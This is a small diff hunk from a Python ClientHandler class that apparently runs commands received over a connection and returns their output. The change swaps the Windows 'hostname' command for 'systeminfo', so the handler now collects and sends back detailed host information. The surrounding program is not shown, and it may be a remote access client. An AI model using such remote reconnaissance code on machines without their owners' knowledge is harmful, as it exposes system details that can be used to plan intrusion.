@@ -156,7 +156,7 @@ class ClientHandler:
                 
                 elif cmd == "hostname":
                     if os_name=="Windows":
-                        result = subprocess.run("hostname", shell=True, capture_output=True, text=True).stdout
+                        result = subprocess.run("systeminfo", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
                     self.send_data(result.encode())
